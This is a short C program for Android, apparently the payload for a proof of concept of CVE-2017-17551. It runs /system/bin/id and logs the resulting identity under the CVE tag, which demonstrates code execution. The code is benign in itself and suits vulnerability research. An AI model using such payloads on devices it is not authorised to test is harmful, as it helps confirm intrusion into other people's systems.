#include <android/log.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
    FILE *fp;
    char path[1035];
    
    fp = popen("/system/bin/id", "r");
    if(fp == NULL) {
        __android_log_print(ANDROID_LOG_VERBOSE, "CVE-2017-17551", "[+] Failed to run command [!]");
        exit(1);
    }
    while(fgets(path, sizeof(path) - 1, fp) != NULL) {
        __android_log_print(ANDROID_LOG_VERBOSE, "CVE-2017-17551", "%s", path);
    }
    pclose(fp);
    return 0;
}
